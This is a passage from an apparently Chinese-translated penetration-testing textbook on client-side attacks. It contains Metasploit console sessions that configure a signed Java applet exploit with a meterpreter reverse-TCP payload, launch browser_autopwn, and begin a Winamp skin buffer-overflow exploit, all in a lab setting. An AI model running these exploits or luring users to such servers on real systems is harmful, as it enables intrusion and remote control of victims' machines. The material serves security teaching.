  \ 0\ntarget => 0\n\nmsf  exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp\n\
  payload => java/meterpreter/reverse_tcp\n\nmsf  exploit(java_signed_applet) > set\
  \ LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf  exploit(java_signed_applet) >\
  \ exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler\
  \ on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/Dgrz12PY\n[*] Server\
  \ started.\n```\n\n与其他 Java 漏洞利用程序一样，我们可以让这种攻击变为多平台的。我们可以将目标更改为 Linux 或 Mac OS，或者使用一个针对所有这些平台的\
  \ Java payload ❶。\n\n### 注意\n\n与我们的 PDF 示例一样，之前的漏洞利用程序让 Java 处于一种糟糕的状态，在尝试运行 applet\
  \ 之前，你可能需要重启 Windows 7。\n\n从你的 Windows 7 目标机器访问 Metasploit 服务器，系统会提示你运行 applet，如图\
  \ 10-2 所示。安全警告会告知，如果此 applet 是恶意的，它将拥有系统访问权限，并告诉你只有在发布者受信任的情况下才运行该应用程序。由于我们没有使用被浏览器证书链信任的签名证书，警告用大字字显示发布者未知。这应该阻止任何人运行恶意\
  \ applet 了，对吧？\n\n![Java applet attack](img/httpatomoreillycomsourcenostarchimages2030398.png.jpg)图\
  \ 10-2. Java applet 攻击\n\n尽管有这些警告，社会工程工具（我们将在下一章中探讨）声称这种攻击是可用攻击中最成功的之一，尽管它并不依赖于\
  \ Java 或底层操作系统的任何未修复漏洞。\n\n##### browser_autopwn\n\n`browser_autopwn` 模块是 Metasploit\
  \ 中提供的另一种客户端利用选项。尽管有时被认为是作弊，但该模块会加载它知道的所有浏览器和浏览器插件模块（包括 Java、Flash 等），并等待浏览器连接服务器。一旦浏览器连接，服务器就会对浏览器进行指纹识别，并提供它认为可能成功的全部漏洞利用程序。示例参见示例\
  \ 10-20\n\n#### 示例 10-20. 启动 browser_autopwn\n\n```\nmsf > use auxiliary/server/browser_autopwn\n\
  msf auxiliary(browser_autopwn) > show options\n\nModule options (auxiliary/server/browser_autopwn):\n\
  \n   Name        Current Setting  Required  Description\n   ----        ---------------\
  \  --------  -----------\n   LHOST                        yes       用于反向连接 payload\
  \ 的 IP 地址\n   SRVHOST     0.0.0.0          yes       监听的本地主机。这必须是本地机器\n        \
  \                                    上的一个地址或 0.0.0.0\n   SRVPORT     8080      \
  \       yes       监听的本地端口。\n   SSL         false            no        为传入的连接协商 SSL\n\
  \   SSLCert                      no        自定义 SSL 证书的路径（默认是随机\n               \
  \                             生成的）\n   SSLVersion  SSL3             no        指定使用的\
  \ SSL 版本\n                                            （接受: SSL2, SSL3, TLS1）\n \
  \  URIPATH                      no        此漏洞利用程序使用的 URI（默认是随机）\n\nmsf auxiliary(browser_autopwn)\
  \ > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf auxiliary(browser_autopwn)\
  \ > set URIPATH autopwn\nURIPATH => autopwn\nmsf auxiliary(browser_autopwn) > exploit\n\
  [*] Auxiliary module execution completed\n\n[*] Setup\nmsf auxiliary(browser_autopwn)\
  \ >\n[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400\n[*] Done in 1.051220065\
  \ seconds\n\n[*] Starting exploit modules on host 192.168.20.9:\n```--\n[*] Using\
  \ URL: http://192.168.20.9:8080/autopwn\n[*] Server started.\n```\n\n\n\n\n在本示例中，我们将诱骗用户替换\
  \ Winamp 音乐播放器的配置文件。当用户下一次打开程序时，无论用户打开哪种音乐文件，恶意的配置文件都会被处理。我们将使用的 Metasploit 模块是\
  \ `exploit/windows/fileformat/winamp_maki_bof`，它利用了 Winamp 5.55 版本中的缓冲区溢出漏洞。\n\n\
  正如你在示例 10-22 中使用 `show options` 所示，该模块没有可以设置的选项；我们只需要一个 Windows 负载。该模块生成一个用于 Winamp\
  \ 皮肤的恶意 Maki 文件。与我们的 PDF 示例一样，由我们来提供文件并为负载设置设置处理器（handler）。\n\n### 示例 10-22. Metasploit\
  \ Winamp 攻击\n\n```\nmsf > use exploit/windows/fileformat/winamp_maki_bof\nmsf  exploit(winamp_maki_bof)\
  \ > show options\n\nModule options (exploit/windows/fileformat/winamp_maki_bof):\n\
  \n   Name  Current Setting  Required  Description\n   ----  ---------------  --------\
  \  -----------\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Winamp 5.55\
